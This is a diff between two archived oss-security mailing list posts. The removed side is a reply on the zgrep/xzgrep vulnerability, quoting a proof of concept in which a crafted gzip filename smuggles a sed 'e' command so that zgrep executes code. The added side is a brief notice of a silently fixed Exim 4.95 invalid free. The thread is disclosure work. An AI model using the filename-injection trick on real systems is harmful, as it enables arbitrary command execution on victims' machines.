@@ -1,67 +1,21 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/04/08/5
-Message-ID: <20220408091808.dlod7nw6qkkugck5@sym.noone.org>
-Date: Fri, 8 Apr 2022 11:18:12 +0200
-From: Axel Beckert <abe@...xchevaux.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/08/06/1
+Message-ID: <2007d258-97ab-fb3c-bfa8-0544c63ec1b8@vulndisco.cc>
+Date: Sat, 6 Aug 2022 12:06:36 +0300
+From: Evgeny Legerov <admin@...ndisco.cc>
 To: oss-security@...ts.openwall.com
-Subject: Re: zgrep, xzgrep: arbitrary-file-write vulnerability
+Subject: Exim 4.95 invalid free
 Content-Type: text/plain; charset=utf-8
 
 Hi,
 
-On Fri, Apr 08, 2022 at 10:23:29AM +0200, Jakub Wilk wrote:
-> As mentioned in the xz patch, if you have GNU sed, you get not just file
-> write, but direct code execution.
 
-Ouch.
+The issue has been silently fixed in Exim 4.96 - 
+https://github.com/ivd38/exim_invalid_free
 
-> PoC:
-> 
->    $ touch foo.gz
->    $ echo foo | gzip > "$(printf '|\n;e cowsay pwned\n#.gz')"
->    $ zgrep foo *.gz
->     _______
->    < pwned >
->     -------
->            \   ^__^
->             \  (oo)\_______
->                (__)\       )\/\
->                    ||----w |
->                    ||     ||
->    foo
 
-JFTR, if you have replaced GNU's zgrep with zgrep from zutils
-(https://www.nongnu.org/zutils/zutils.html; allows to use z* tools
-with many compression formats, also mixed in a single command), then
-this exploit does not work:
 
-abe@c6:~/tmp/zgrep-PoC $ touch foo.gz
-abe@c6:~/tmp/zgrep-PoC $ echo foo | gzip > "$(printf '|\n;e cowsay pwned\n#.gz')"
-abe@c6:~/tmp/zgrep-PoC $ zgrep foo *.gz
-|
-;e cowsay pwned
-#.gz:foo
-abe@c6:~/tmp/zgrep-PoC $ zgrep.gzip foo *.gz
- _______
-< pwned >
- -------
-        \   ^__^
-         \  (oo)\_______
-            (__)\       )\/\
-                ||----w |
-                ||     ||
-foo
-abe@c6:~/tmp/zgrep-PoC $ dpkg -S /bin/zgrep
-diversion by zutils from: /bin/zgrep
-diversion by zutils to: /bin/zgrep.gzip
-gzip, zutils: /bin/zgrep
-abe@c6:~/tmp/zgrep-PoC
+regards,
 
-		Kind regards, Axel
--- 
-PGP: 2FF9CD59612616B5      /~\  Plain Text Ribbon Campaign, http://arc.pasp.de/
-Mail: abe@...xchevaux.org  \ /  Say No to HTML in E-Mail and Usenet
-Mail+Jabber: abe@...ne.org  X
-https://axel.beckert.ch/   / \  I love long mails: https://email.is-not-s.ms/
+-e
 
-Download attachment "signature.asc" of type "application/pgp-signature" (834 bytes)
